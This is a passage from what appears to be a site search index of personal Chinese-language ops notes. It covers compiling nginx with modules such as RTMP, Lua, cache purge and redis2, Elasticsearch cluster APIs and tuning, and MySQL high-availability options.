\\\n--with-pcre=/usr/local/src/pcre-8.33\n\n./configure \\\n--user=nginx \\\n--group=nginx \\\n--prefix=/usr/local/nginx-rtmp \\\n--add-module=/usr/local/src/nginx-rtmp-module-1.1.7 \\\n--with-http_ssl_module \\\n--with-http_ssl_module \\\n--with-http_realip_module \\\n--with-http_addition_module \\\n--with-http_sub_module \\\n--with-http_dav_module \\\n--with-http_flv_module \\\n--with-http_mp4_module \\\n--with-http_gunzip_module \\\n--with-http_gzip_static_module \\\n--with-http_random_index_module \\\n--with-http_secure_link_module \\\n--with-http_stub_status_module \\\n--with-http_auth_request_module \\\n--with-file-aio \\\n--with-ipv6 \\\n--with-http_spdy_module \\\n--with-pcre=/usr/local/src/pcre-8.33 \\\n--with-debug \n\nhttp://192.168.1.6:8080/record.html\nhttp://192.168.1.6:8080/index.html\n\nhttp://192.168.1.6:8080/rtmp-publisher/publisher.html\nhttp://192.168.1.6:8080/rtmp-publisher/player.html\n\nhttp://server.com/control/record/start|stop?srv=SRV&amp;app=APP&amp;name=NAME&amp;rec=REC\ncurl -i \"http://192.168.1.6:8080/control/record/start?app=myapp&amp;name=mystream&amp;rec=rec1\"\ncurl -i \"http://192.168.1.6:8080/control/record/stop?app=myapp&amp;name=mystream&amp;rec=rec1\"\n\nhttp://server.com/control/drop/publisher|subscriber|client?srv=SRV&amp;app=APP&amp;name=NAME&amp;addr=ADDR&amp;clientid=CLIENTID\ncurl -i \"http://192.168.1.6:8080/control/drop/publisher?app=myapp&amp;name=mystream\"\ncurl -i \"http://192.168.1.6:8080/control/drop/client?app=myapp&amp;name=mystream\"\ncurl -i \"http://192.168.1.6:8080/control/drop/client?app=myapp&amp;name=mystream&amp;addr=192.168.0.1\"\ncurl -i \"http://192.168.1.6:8080/control/drop/client?app=myapp&amp;name=mystream&amp;clientid=1\"\n</code></pre>"},{"location":"daily/46-nginx/#module","title":"\u56db\u3001Module","text":"<pre><code>cd /usr/local/src\n\nwget http://192.168.1.22/nginx/nginx-1.4.7.tar.gz \nwget http://192.168.1.22/nginx/nginx-mogilefs-module-1.0.5.tar.gz\nwget http://192.168.1.22/nginx/nginx-requestkey-module-1.0.tar.gz\nwget http://192.168.1.22/nginx/pcre-8.33.tar.gz\n\nyum install -y zlib.x86_64 zlib-devel.x86_64 gzip.x86_64 pcre.x86_64 pcre-devel.x86_64\n\nuseradd -M nginx \nmkdir -p /data/logs/nginx\n\nvim src/core/nginx.h\n#define NGINX_VERSION \"1.0_1.4.7\"\n#define NGINX_VER \"UPLUS_SERVER/\" NGINX_VERSION\n#define NGINX_VAR \"UPLUS_SERVER\"\n#define NGX_OLDPID_EXT \".oldbin\"\n\nvim src/http/ngx_http_header_filter_module.c\nstatic char ngx_http_server_string[] = \"Server: UPLUS_SERVER\" CRLF;\n\n./configure \\\n--prefix=/usr/local/nginx \\\n--user=nginx \\\n--group=nginx \\\n--with-http_gunzip_module \\\n--with-http_gzip_static_module \\\n--with-http_stub_status_module \n\nmake &amp;&amp; make install\n\n\n=======\n\nyum install -y  binutils make cmake vim gcc gcc-devel\nyum install -y pcre-devel.x86_64 pcre.x86_64\nyum install -y openssl-devel.x86_64 openssl.x86_64\nyum install -y gd-devel.x86_64 gd.x86_64\nyum install -y GeoIP-devel.x86_64 GeoIP.x86_64\nyum install -y libxml2-devel.x86_64 libxml2.x86_64 libxslt-devel.x86_64 libxslt.x86_64\n\nvim src/core/nginx.h\n...\n#define nginx_version      1006002\n#define NGINX_VERSION      \"1.1_1.6.2\"\n#define NGINX_VER          \"UPLUS_SERVER/\" NGINX_VERSION\n\n#define NGINX_VAR          \"UPLUSE_SERVER\"\n#define NGX_OLDPID_EXT     \".oldbin\"\n...\n\nvim src/http/ngx_http_header_filter_module.c\n...\nstatic char ngx_http_server_string[] = \"Server: UPLUS_SERVER\" CRLF;\n...\n\ncat &gt; /etc/profile.d/nginx-env.sh &lt;&lt;EOF\nexport NGINX_HOME=/usr/local/nginx\nexport PATH=\\${NGINX_HOME}/sbin:\\$PATH\nEOF\n. /etc/profile\necho $PATH\nwhich nginx\n\nUPLUS_SERVER/1.1_1.6.2\n\n./configure --prefix=/usr/local/nginx  --user=nginx --group=nginx --conf-path=/usr/local/nginx/conf/nginx.conf --error-log-path=/usr/local/nginx/logs/error.log --http-client-body-temp-path=/usr/local/nginx/body --http-fastcgi-temp-path=/usr/local/nginx/fastcgi --http-log-path=/usr/local/nginx/logs/access.log --http-proxy-temp-path=/usr/local/nginx/proxy --http-scgi-temp-path=/usr/local/nginx/scgi --http-uwsgi-temp-path=/usr/local/nginx/uwsgi --lock-path=/var/run/nginx.lock --pid-path=/var/run/nginx.pid --with-debug --with-http_addition_module --with-http_dav_module --with-http_geoip_module --with-http_gzip_static_module --with-http_image_filter_module --with-http_realip_module --with-http_stub_status_module --with-http_ssl_module --with-http_sub_module --with-http_xslt_module --with-ipv6 --with-sha1=/usr/include/openssl --with-md5=/usr/include/openssl --with-mail --with-mail_ssl_module --with-http_gunzip_module \n\nmake &amp;&amp; make install\n\n\n./configure \\\n--prefix=/usr/local/nginx \\\n--user=nginx \\\n--group=nginx \\\n--with-http_ssl_module \\\n--with-http_realip_module \\\n--with-http_addition_module \\\n--with-http_sub_module \\\n--with-http_dav_module \\\n--with-http_flv_module \\\n--with-http_mp4_module \\\n--with-http_gunzip_module \\\n--with-http_gzip_static_module \\\n--with-http_random_index_module \\\n--with-http_secure_link_module \\\n--with-http_stub_status_module \\\n--with-http_auth_request_module \\\n--with-mail \\\n--with-mail_ssl_module \\\n--with-file-aio \\\n--with-ipv6 \\\n--with-http_spdy_module \\\n--with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector \\\n--param=ssp-buffer-size=4 -m64 -mtune=generic'\n\n# add-module nginx-rtmp-module\n./configure \\\n--prefix=/usr/local/nginx \\\n--user=nginx \\\n--group=nginx \\\n--with-http_ssl_module \\\n--with-http_realip_module \\\n--with-http_addition_module \\\n--with-http_sub_module \\\n--with-http_dav_module \\\n--with-http_flv_module \\\n--with-http_mp4_module \\\n--with-http_gunzip_module \\\n--with-http_gzip_static_module \\\n--with-http_random_index_module \\\n--with-http_secure_link_module \\\n--with-http_stub_status_module \\\n--with-http_auth_request_module \\\n--with-mail \\\n--with-mail_ssl_module \\\n--with-file-aio \\\n--with-ipv6 \\\n--with-http_spdy_module \\\n--with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector \\\n--param=ssp-buffer-size=4 -m64 -mtune=generic' \\\n--add-module=../nginx-rtmp-module-1.1.7 \\\n--with-pcre=../pcre-8.33\n\n================================================================================\n\n./configure  \\\n--prefix=/usr/local/nginx  \\\n--user=nginx  \\\n--group=nginx  \\\n--with-http_ssl_module  \\\n--with-http_realip_module  \\\n--with-http_addition_module  \\\n--with-http_sub_module  \\\n--with-http_dav_module  \\\n--with-http_flv_module  \\\n--with-http_mp4_module  \\\n--with-http_gunzip_module  \\\n--with-http_gzip_static_module  \\\n--with-http_random_index_module  \\\n--with-http_secure_link_module  \\\n--with-http_stub_status_module  \\\n--with-http_auth_request_module  \\\n--with-mail  \\\n--with-mail_ssl_module  \\\n--with-file-aio  \\\n--with-ipv6  \\\n--with-http_spdy_module  \\\n--with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic'  \\\n--with-http_image_filter_module \\\n--with-pcre=../pcre-8.36  \\\n--add-module=../echo-nginx-module-0.58 \\\n--add-module=../nginx-rtmp-module-1.1.7  \\\n--add-module=../ngx_cache_purge-2.3 \\\n--add-module=../ngx_devel_kit-0.2.19 \\\n--add-module=../lua-nginx-module-0.10.0 \\\n--add-module=../ngx_pagespeed-release-1.9.32.11-beta  \\\n--add-module=../redis2-nginx-module-0.12 \\\n--add-module=../sqlite-http-basic-auth-nginx-module-master \n\n\nmake &amp;&amp; make install\n\n#(\u672a\u6210\u529f)--add-module=../ngx_image_thumb \\\n#(\u672a\u6210\u529f)--add-module=../nginx-requestkey-module \\\n\nwget http://uplus.file.youja.cn/nginx/pcre-8.36.tar.gz\n\n--------------------------\n\n--with-http_image_filter_module # images_filter\nyum install gd-devel # gcc automake autoconf m4\napt-get install libgd2-xpm libgd2-xpm-dev # build-essential m4 autoconf automake make libcurl-dev libgd2-dev libpcre-dev \n\nconf: \nimage_filter test; #\u6d4b\u8bd5\u56fe\u7247\u5408\u6cd5\u6027\nimage_filter rotate 90|180|270; #\u89d2\u5ea6\u65cb\u8f6c\nimage_filter size; #\u83b7\u53d6\u56fe\u7247\u7684ID3\u4fe1\u606f\u5bbd\u548c\u9ad8\nresize [width] [height]; #\u6307\u5b9a\u5bbd\u548c\u9ad8\nimage_filter crop [width] [height]; #\u6700\u5927\u8fb9\u7f29\u653e\u56fe\u7247\u540e\u88c1\u526a\nimage_filter_buffer; #\u9650\u5236\u56fe\u7247\u6700\u5927\u8bfb\u53d6\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a1M\nimage_filter_jpeg_quality; #\u8bbe\u7f6ejpeg\u56fe\u7247\u7684\u538b\u7f29\u8d28\u91cf\u6bd4\u4f8b\nimage_filter_transparency; #\u7528\u6765\u7981\u7528gif\u548cpalette-based\u7684png\u56fe\u7247\u7684\u900f\u660e\u5ea6\uff0c\u4ee5\u6b64\u6765\u63d0\u9ad8\u56fe\u7247\u8d28\u91cf\u3002\n\n--------------------------\n\n--add-module=../ngx_pagespeed-release-1.10.33.1-beta  \\ \n# google optimze image\ncd /usr/local/src\nNPS_VERSION=1.10.33.1\nwget https://github.com/pagespeed/ngx_pagespeed/archive/release-${NPS_VERSION}-beta.zip -O release-${NPS_VERSION}-beta.zip\nunzip release-${NPS_VERSION}-beta.zip\ncd ngx_pagespeed-release-${NPS_VERSION}-beta/\nwget https://dl.google.com/dl/page-speed/psol/${NPS_VERSION}.tar.gz\ntar -xzvf ${NPS_VERSION}.tar.gz\n\n--------------------------\n\n--add-module=../ngx_image_thumb # ngx_image_thumb\uff0c\u672a\u7f16\u8bd1\u901a\u8fc7\nimage on/off \u662f\u5426\u5f00\u542f\u7f29\u7565\u56fe\u529f\u80fd,\u9ed8\u8ba4\u5173\u95ed\nimage_backend on/off \u662f\u5426\u5f00\u542f\u955c\u50cf\u670d\u52a1\uff0c\u5f53\u5f00\u542f\u8be5\u529f\u80fd\u65f6\uff0c\u8bf7\u6c42\u76ee\u5f55\u4e0d\u5b58\u5728\u7684\u56fe\u7247\uff08\u5224\u65ad\u539f\u56fe\uff09\uff0c\u5c06\u81ea\u52a8\u4ece\u955c\u50cf\u670d\u52a1\u5668\u5730\u5740\u4e0b\u8f7d\u539f\u56fe\nimage_backend_server \u955c\u50cf\u670d\u52a1\u5668\u5730\u5740\nimage_output on/off \u662f\u5426\u4e0d\u751f\u6210\u56fe\u7247\u800c\u76f4\u63a5\u5904\u7406\u540e\u8f93\u51fa \u9ed8\u8ba4off\nimage_jpeg_quality 75 \u751f\u6210JPEG\u56fe\u7247\u7684\u8d28\u91cf \u9ed8\u8ba4\u503c75\nimage_water on/off \u662f\u5426\u5f00\u542f\u6c34\u5370\u529f\u80fd\nimage_water_type 0/1 \u6c34\u5370\u7c7b\u578b 0:\u56fe\u7247\u6c34\u5370 1:\u6587\u5b57\u6c34\u5370\nimage_water_min 300 300 \u56fe\u7247\u5bbd\u5ea6 300 \u9ad8\u5ea6 300 \u7684\u60c5\u51b5\u624d\u6dfb\u52a0\u6c34\u5370\nimage_water_pos 0-9 \u6c34\u5370\u4f4d\u7f6e \u9ed8\u8ba4\u503c9 0\u4e3a\u968f\u673a\u4f4d\u7f6e,1\u4e3a\u9876\u7aef\u5c45\u5de6,2\u4e3a\u9876\u7aef\u5c45\u4e2d,3\u4e3a\u9876\u7aef\u5c45\u53f3,4\u4e3a\u4e2d\u90e8\u5c45\u5de6,5\u4e3a\u4e2d\u90e8\u5c45\u4e2d,6\u4e3a\u4e2d\u90e8\u5c45\u53f3,7\u4e3a\u5e95\u7aef\u5c45\u5de6,8\u4e3a\u5e95\u7aef\u5c45\u4e2d,9\u4e3a\u5e95\u7aef\u5c45\u53f3\nimage_water_file \u6c34\u5370\u6587\u4ef6(jpg/png/gif),\u7edd\u5bf9\u8def\u5f84\u6216\u8005\u76f8\u5bf9\u8def\u5f84\u7684\u6c34\u5370\u56fe\u7247\nimage_water_transparent \u6c34\u5370\u900f\u660e\u5ea6,\u9ed8\u8ba420\nimage_water_text \u6c34\u5370\u6587\u5b57 \"Power By Vampire\"\nimage_water_font_size \u6c34\u5370\u5927\u5c0f \u9ed8\u8ba4 5\nimage_water_font \u6587\u5b57\u6c34\u5370\u5b57\u4f53\u6587\u4ef6\u8def\u5f84\nimage_water_color \u6c34\u5370\u6587\u5b57\u989c\u8272,\u9ed8\u8ba4 #000000\n\n--------------------------\n\n--add-module=../nginx-rtmp-module-1.1.7  \\ # rtmp\n#RTMP\nwget http://uplus.file.youja.cn/nginx/nginx-rtmp-module-1.1.7.tar.gz\n\n\n--------------------------\n\n--add-module=../ngx_cache_purge\n#\u6e05\u9664\u7f13\u5b58\u6587\u4ef6\ngit clone https://github.com/FRiCKLE/ngx_cache_purge.git\n\nproxy_cache_path /dev/shm levels=1:2 keys_zone=jcache:128m inactive=1d max_size=256m;  \nserver {\n    listen      80;\n\n    location ~* ^/purge(/\\S+)$ {\n        proxy_cache_purge jcache $1;\n    }\n\n    location ~* .*\\.(jpg|png|gif|css|js)$ {\n        proxy_cache jcache;\n        proxy_cache_valid 200 302 30m;\n        proxy_cache_key $uri;\n        proxy_set_header Host \"www.baidu.com\";\n        proxy_pass http://www.baidu.com;\n    }\n\n    location / {\n        proxy_set_header Host \"www.youja.cn\";\n        proxy_pass http://www.baidu.com;\n    }\n}\n\nhttp://domain\nhttp://domain/purge/test.png\n\n--------------------------\n\n--add-module=../nginx-requestkey-module\n#key\u52a0\u5bc6\u9a8c\u8bc1 \uff08\u672a\u901a\u8fc7\uff09\u4f30\u8ba1\u9ad8\u7248\u672c\u4e0d\u652f\u6301\u6b64\u529f\u80fd\uff0c\u6216module\u5f85\u66f4\u65b0\nhttps://github.com/miyanaga/nginx-requestkey-module.git\n\n\uff08\u5b98\u65b9\u8c8c\u4f3c\u6ca1\u4e86\uff09\u4e0b\u8f7d\u6587\u4ef6\uff1aNginx-accesskey-2.03.tar.gz \n\u89e3\u538b\u540e \u4fee\u6539conf\u6587\u4ef6\uff0c\u628a\u201d$HTTP_ACCESSKEY_MODULE\u201c\u66ff\u6362\u4e3a\"ngx_http_accesskey_module\",\u7136\u540e\u7f16\u8bd1nginx;\naccesskey\n\u8bed\u53e5: accesskey [on|off]\n\u9ed8\u8ba4: accesskey off\n\u53ef\u4ee5\u7528\u5728: main, server, location\n\u5f00\u542f access-key \u529f\u80fd\u3002\naccesskey_arg\n\u8bed\u53e5: accesskey_arg \"\u5b57\u7b26\"\n\u9ed8\u8ba4: accesskey \"key\"\n\u53ef\u4ee5\u7528\u5728: main, server, location\nURL\u4e2d\u5305\u542b access key \u7684GET\u53c2\u6570\u3002\naccesskey_hashmethod\n\u8bed\u53e5: accesskey_hashmethod [md5|sha1]\n\u9ed8\u8ba4: accesskey_hashmethod md5\uff08\u9ed8\u8ba4\u7528 md5 \u52a0\u5bc6\uff09\n\u53ef\u4ee5\u7528\u5728: main, server, location\n\u7528 MD5 \u8fd8\u662f SHA1 \u52a0\u5bc6 access key\u3002\naccesskey_signature\n\u8bed\u53e5: accesskey_signature \"\u5b57\u7b26\"\n\u9ed8\u8ba4: accesskey_signature \"$remote_addr\"\n\u53ef\u7528\u5728: main, server, location\n\nlocation / {\n   default_type text/plain; \n   accesskey             on;\n   accesskey_hashmethod  md5;\n   accesskey_arg         \"key\";\n   accesskey_signature   \"jesse$uri\";\n   return 200 \"OK\";\n}\n\n--------------------------\n\n--add-module=../redis2-nginx-module-0.12\n#\u64cd\u4f5credis\nhttps://github.com/openresty/redis2-nginx-module.git\n\nupstream redis_pool{\n    server 127.0.0.1:6379;\n}\n\nserver {\n    listen      80;\n\n    location ~* \"^/(\\w+)$\" {\n        redis2_query $1;\n        redis2_pass redis_pool;\n    }\n\n    location ~* \"^/(\\w+)/(\\w+)$\" {\n        redis2_query $1 $2;\n        redis2_pass redis_pool;\n    }\n\n    location ~* \"^/(\\w+)/(\\w+)/(\\w+)$\" {\n        redis2_query $1 $2 $3;\n        redis2_pass redis_pool;\n    }\n\n    location ~* \"^/(\\w+)/(\\w+)/(\\w+)/(\\w+)$\" {\n        redis2_query $1 $2 $3 $4;\n        redis2_pass redis_pool;\n    }\n    location ~* \"^/(\\w+)/(\\w+)/(\\w+)/(\\w+)/(\\w+)$\" {\n        redis2_query $1 $2 $3 $4 $5;\n        redis2_pass redis_pool;\n    }\n\n    location / {\n        default_type text/plain;\n        return 200 \"Not found $uri\";\n    }\n}\n\ncurl http://domain/set/one/first\ncurl http://domain/get/one\n\n--------------------------\n\n--add-module=../sqlite-http-basic-auth-nginx-module-master\nhttps://github.com/kunal/sqlite-http-basic-auth-nginx-module.git\n#sqlite\u4f7f\u7528\nlocation / {\n        auth_sqlite_basic \"Restricted Sqlite\";\n        auth_sqlite_basic_database_file  /dev/shm/sqlite3.db; # Sqlite DB file\n        auth_sqlite_basic_database_table  auth_table; # Sqlite DB table\n        auth_sqlite_basic_table_user_column  user; # User column\n        auth_sqlite_basic_table_passwd_column  password; # Password column\n   }\n\n--------------------------\n\n\nNginx + Lua\n\nwget http://luajit.org/download/LuaJIT-2.0.4.tar.gz\ntar xvzf LuaJIT-2.0.4.tar.gz\ncd LuaJIT-2.0.4\nmake &amp;&amp; make install\n\ncat &gt; /etc/profile.d/lua-env.sh &lt;&lt; EOF\nexport LUAJIT_LIB=/usr/local/lib\nexport LUAJIT_INC=/usr/local/include/luajit-2.0\n\nEOF\n\nwget -O lua-nginx-module-0.10.0.tar.gz https://codeload.github.com/openresty/lua-nginx-module/tar.gz/v0.10.0\nwget -O ngx_devel_kit-0.2.19.tar.gz https://codeload.github.com/simpl/ngx_devel_kit/tar.gz/v0.2.19\n\ntar xvzf lua-nginx-module-0.10.0.tar.gz\ntar xvzf ngx_devel_kit-0.2.19.tar.gz \n\n--add-module=../ngx_devel_kit-0.2.19 \\\n--add-module=../lua-nginx-module-0.10.0\n\ncannot open shared object file: No such file or directory  \u89e3\u51b3\u65b9\u6cd5\n\nldd /usr/local/nginx/sbin/nginx\n\necho \"/usr/local/lib\" &gt; /etc/ld.so.conf.d/usr_local_lib.conf\n\nlocation /lua {\n    set $test \"hello, world.\";\n    content_by_lua '\n        ngx.header.content_type = \"text/plain\";\n        ngx.say(ngx.var.test);\n    ';\n}\n\n--------------------------\n\necho-nginx-module\n\n--add-module=../echo-nginx-module-0.58\n\nwget -O echo-nginx-module-0.58.tar.gz https://codeload.github.com/openresty/echo-nginx-module/tar.gz/v0.58\n\nlocation /echo {\n    default_type text/plain;\n    echo \"Hello, jesse\";\n\n}\n\n--------------------------\n\n-- 2016-04-26 1.10.0 support stream\n\n./configure --prefix=/usr/local/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_random_index_module --with-http_secure_link_module --with-http_stub_status_module --with-http_auth_request_module --with-mail --with-mail_ssl_module --with-file-aio --with-ipv6 --with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic' --with-pcre=../pcre-8.38 --with-http_image_filter_module --add-module=../nginx-rtmp-module-1.1.7 --add-module=../ngx_cache_purge --with-stream\n\n\nstream {\n    upstream test_tcp {\n        server 127.0.0.1:11111 weight=5;\n        server 127.0.0.1:11112 max_fails=3 fail_timeout=30s;\n    }\n\n    upstream test_udp {\n        server 127.0.0.1:11111 weight=5;\n        server 127.0.0.1:11112 max_fails=3 fail_timeout=30s;\n    }\n\n    server {\n       listen 12345;\n       proxy_connect_timeout 1s;\n       proxy_timeout 3s;\n       proxy_responses 1;\n       proxy_pass test_tcp;\n   }\n\n    server {\n       listen 12345 udp;\n       proxy_connect_timeout 1s;\n       proxy_timeout 3s;\n       proxy_responses 1;\n       proxy_pass test_tcp;\n    }\n}\n\ncat &gt; /etc/profile.d/openresty-env.sh &lt;&lt;EOF\nexport OPENRESTY_HOME=/usr/local/openresty\nexport PATH=\\${OPENRESTY_HOME}/bin:\\${OPENRESTY_HOME}/luajit/bin:\\$PATH\nEOF\n\n\nhttps://openresty.org/download/ngx_openresty-1.9.7.2.tar.gz\n\nhttps://openresty.org/download/openresty-1.11.2.1.tar.gz\n</code></pre>"},{"location":"daily/47-elastic/","title":"elastic","text":"<p>API</p>"},{"location":"daily/47-elastic/#_1","title":"\u4e00\u3001\u57fa\u672c\u64cd\u4f5c","text":"<pre><code>/_cat/allocation\n/_cat/shards\n/_cat/shards/{index}\n/_cat/master\n/_cat/nodes\n/_cat/tasks\n/_cat/indices\n/_cat/indices/{index}\n/_cat/segments\n/_cat/segments/{index}\n/_cat/count\n/_cat/count/{index}\n/_cat/recovery\n/_cat/recovery/{index}\n/_cat/health\n/_cat/pending_tasks\n/_cat/aliases\n/_cat/aliases/{alias}\n/_cat/thread_pool\n/_cat/thread_pool/{thread_pools}\n/_cat/plugins\n/_cat/fielddata\n/_cat/fielddata/{fields}\n/_cat/nodeattrs\n/_cat/repositories\n/_cat/snapshots/{repository}\n/_cat/templates\n</code></pre>"},{"location":"daily/47-elastic/#_2","title":"\u4e8c\u3001\u5e38\u7528\u4f18\u5316","text":""},{"location":"daily/47-elastic/#21","title":"2.1 \u64cd\u4f5c\u7cfb\u7edf","text":"<p>/etc/security/limits.d/elastic.conf</p> <pre><code>elastic soft memlock unlimited\nelastic hard memlock unlimited\nelastic soft nofile 655350\nelastic hard nofile 655350\nelastic soft nproc  655350\nelastic hard nproc  655350\n</code></pre> <p>/etc/sysctl.d/elastic.conf</p> <pre><code>vm.max_map_count = 262144\n\n# sysctl -p\n</code></pre>"},{"location":"daily/47-elastic/#22","title":"2.2 \u96c6\u7fa4\u914d\u7f6e","text":"<p>\u901a\u8fc7 kibana's Dev Tools </p>"},{"location":"daily/47-elastic/#221-ilm","title":"2.2.1 ILM","text":"<p>Reference</p> <p>\u4e00\u6b21\u4f7f\u7528</p>"},{"location":"daily/47-elastic/#222-rebalance","title":"2.2.2  rebalance","text":"<p>\u7981\u7528\u8c03\u5ea6</p> <p>\u7528\u4e8e\u6dfb\u52a0\u8282\u70b9\u540e\u4e0d\u8ba9\u4e3b\u52a8\u8c03\u5ea6 rebalance\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5f53 elastic cluster \u6709\u65b0\u8282\u70b9\u52a0\u5165\u7684\u65f6\u5019\uff0c\u8282\u70b9\u4e0a\u7684 shards \u4f1a\u81ea\u52a8\u5747\u8861\u5b58\u50a8\u5728\u6240\u6709\u53ef\u7528\u7684\u8282\u70b9\uff0c\u6545\u65b0\u8282\u70b9\u52a0\u5165\u65f6\u4f1a\u4ea7\u751f\u5927\u91cf\u7684 replica \u52a8\u4f5c\uff0c\u8282\u70b9\u8d1f\u8f7d\u53d8\u9ad8\uff0cIO \u6d88\u8017\u53d8\u9ad8\u3002</p> <p>\u53ef\u9009\u914d\u7f6e\u503c\uff1anone | true</p> <pre><code>GET /_cluster/settings\n\nPUT /_cluster/settings\n{\n  \"transient\" : {\n    \"cluster\" : {\n      \"routing\" : {\n        \"rebalance\" : {\n          \"enable\" : \"none\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>\u4e3b\u52a8\u8c03\u5ea6</p> <pre><code>POST /_cluster/reroute\n{\n  \"commands\": [\n    {\n      \"move\": {\n        \"index\": \"demo-json-2023.02.10\",\n        \"shard\": 1,\n        \"from_node\": \"elastic-cluster-data-2\",\n        \"to_node\": \"elastic-cluster-data-1\"\n      }\n    }\n  ]\n}\n</code></pre>"},{"location":"daily/47-elastic/#223-mapping","title":"2.2.3 mapping","text":"<p>Reference</p>"},{"location":"daily/47-elastic/#23-beats","title":"2.3 beats\u914d\u7f6e","text":""},{"location":"daily/47-elastic/#231-filebeat","title":"2.3.1 filebeat","text":"<p>Reference</p> <pre><code>filebeat.inputs:\n- type: log # \u4ec5\u53ef\u8f93\u5165\u63d0\u524d\u5185\u7f6e\u7684log/stdin/docker/container/journald... \n</code></pre>"},{"location":"daily/47-elastic/#232-processor","title":"2.3.2 processor","text":"<p>Reference</p> <pre><code># \u6709\u6548\u914d\u7f6e\n      processors:\n      - drop_fields:\n          fields: [\"agent.ephemeral_id\", \"agent.id\", \"agent.name\", \"agent.type\", \"agent.version\", \"ecs\", \"host\"]\ndrop \n# \u65e0\u6548\u914d\u7f6e\n#          fields: [\"agent.ephemeral_id\", \"agent.id\", \"agent.name\", \"agent.type\", \"agent.version\", \"ecs\", \"host\", \"fields.topic\", \"input.type\", \"log\"]\n# \u6000\u7591 \"host\", \"fields.topic\", \"input.type\", \"log\" \u5b57\u6bb5\u4e0d\u5141\u8bb8\n</code></pre>"},{"location":"daily/48-mysql/","title":"mysql","text":""},{"location":"daily/48-mysql/#_1","title":"\u4e00\u3001\u9ad8\u53ef\u7528","text":""},{"location":"daily/48-mysql/#11-github-orchestrator","title":"1.1 github orchestrator","text":""},{"location":"daily/48-mysql/#12-mycat2","title":"1.2 mycat2","text":"<p>Reference</p>"},{"location":"daily/48-mysql/#13-mmm","title":"1.3 MMM","text":"<p>\u9700\u8981\u4e24\u4e2aMaster\uff0c\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u4e00\u4e2aMaster\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\uff0c\u53ef\u4ee5\u8bf4\u662f\u4e3b\u5907\u6a21\u5f0f\u3002</p> <p>\u9700\u8981\u57fa\u7840\u8d44\u6e90\uff1a</p> \u8d44\u6e90 \u6570\u91cf \u8bf4\u660e \u4e3bDB 2 \u7528\u6237\u4e3b\u5907\u6a21\u5f0f\u7684\u4e3b\u4e3b\u590d\u5236 \u4eceDB 0~N\u53f0 \u53ef\u4ee5\u6839\u636e\u9700\u8981\u914d\u7f6eN\u53f0\u4ece\u670d\u52a1\u5668 IP\u5730\u5740 2n+1 N\u4e3aMySQL\u670d\u52a1\u5668\u7684\u6570\u91cf \u76d1\u63a7\u7528\u6237 1 \u7528\u6237\u76d1\u63a7\u6570\u636e\u5e93\u72b6\u6001\u7684MySQL\u7528\u6237\uff08replication\uff09 \u4ee3\u7406\u7528\u6237 1 \u7528\u4e8eMMM\u4ee3\u7406\u7aef\u6539\u53d8read_only\u72b6\u6001 <p>\u6545\u969c\u8f6c\u79fb\u6b65\u9aa4\uff1a</p> <ul> <li>Slave\u670d\u52a1\u5668\u4e0a\u7684\u64cd\u4f5c</li> <li>\u5b8c\u6210\u539f\u4e3b\u4e0a\u5df2\u7ecf\u590d\u5236\u7684\u65e5\u5fd7\u6062\u590d</li> <li>\u4f7f\u7528Change Master\u547d\u4ee4\u914d\u7f6e\u65b0\u4e3b</li> <li>\u4e3b\u670d\u52a1\u5668\u4e0a\u64cd\u4f5c</li> <li>\u8bbe\u7f6eread_only\u5173\u95ed</li> <li>\u8fc1\u79fbVIP\u5230\u65b0\u4e3b\u670d\u52a1\u5668</li> </ul> <p>\u4f18\u70b9\uff1a</p> <ul> <li>\u63d0\u4f9b\u4e86\u8bfb\u5199VIP\u7684\u914d\u7f6e\uff0c\u8bd5\u8bfb\u5199\u8bf7\u6c42\u90fd\u53ef\u4ee5\u8fbe\u5230\u9ad8\u53ef\u7528</li> <li>\u5de5\u5177\u5305\u76f8\u5bf9\u6bd4\u8f83\u5b8c\u5584\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u5f00\u53d1\u811a\u672c</li> <li>\u5b8c\u6210\u6545\u969c\u8f6c\u79fb\u4e4b\u540e\u53ef\u4ee5\u5bf9MySQL\u96c6\u7fa4\u8fdb\u884c\u9ad8\u53ef\u7528\u76d1\u63a7</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li>\u6545\u969c\u7b80\u5355\u7c97\u66b4\uff0c\u5bb9\u6613\u4e22\u5931\u4e8b\u52a1\uff0c\u5efa\u8bae\u91c7\u7528\u534a\u540c\u6b65\u590d\u5236\u65b9\u5f0f\uff0c\u51cf\u5c11\u5931\u8d25\u7684\u6982\u7387</li> <li>\u76ee\u524dMMM\u793e\u533a\u5df2\u7ecf\u7f3a\u5c11\u7ef4\u62a4\uff0c\u4e0d\u652f\u6301\u57fa\u4e8eGTID\u7684\u590d\u5236</li> </ul> <p>\u9002\u7528\u573a\u666f\uff1a</p> <ul> <li>\u8bfb\u5199\u90fd\u9700\u8981\u9ad8\u53ef\u7528\u7684</li> <li>\u57fa\u4e8e\u65e5\u5fd7\u70b9\u7684\u590d\u5236\u65b9\u5f0f</li> </ul>"},{"location":"daily/48-mysql/#14-mha","title":"1.4 MHA","text":"<p>\u9700\u8981\u8d44\u6e90\uff1a </p> \u8d44\u6e90 \u6570\u91cf \u8bf4\u660e \u4e3bDB 2 \u7528\u4e8e\u4e3b\u5907\u6a21\u5f0f\u7684\u4e3b\u4e3b\u590d\u5236 \u4eceDB 2~N\u53f0 \u53ef\u4ee5\u6839\u636e\u9700\u8981\u914d\u7f6eN\u53f0\u4ece\u670d\u52a1\u5668 IP\u5730\u5740 n+2 N\u4e3aMySQL\u670d\u52a1\u5668\u7684\u6570\u91cf \u76d1\u63a7\u7528\u6237 1 